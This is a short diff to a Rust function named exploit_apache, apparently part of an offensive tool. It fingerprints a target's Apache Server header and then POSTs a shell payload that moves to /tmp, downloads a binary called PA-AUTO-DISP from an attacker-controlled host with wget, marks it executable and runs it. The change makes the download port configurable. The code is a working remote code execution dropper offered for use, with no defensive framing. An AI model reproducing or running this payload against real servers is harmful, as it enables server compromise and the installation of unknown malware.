@@ -27,10 +27,7 @@ pub async fn get_apache_headers(target: String) -> Result<(), Box<dyn StdError>>
         return Err("Server header not found".into());
     }
 }
-pub(crate) async fn exploit_apache(
-    target_ip: &str,
-    srv: &str,
-) {
+pub(crate) async fn exploit_apache(target_ip: &str, srv: &str, port: &str) {
 
     match get_apache_headers(target_ip.to_string()).await {
         Ok(..) => {
@@ -42,8 +39,9 @@ pub(crate) async fn exploit_apache(
                 .arg("POST")
                 .arg("-d")
                 .arg(format!(
-                    "echo; cd /tmp && wget http://{}:8000/PA-AUTO-DISP && chmod +x PA-AUTO-DISP && ./PA-AUTO-DISP",
-                    srv
+                    "echo; cd /tmp && wget http://{}:{}/PA-AUTO-DISP && chmod +x PA-AUTO-DISP && ./PA-AUTO-DISP",
+                    srv,
+                    port
                 )) //ajouter ./...
                 //.arg("echo;id")
                 .arg(url)
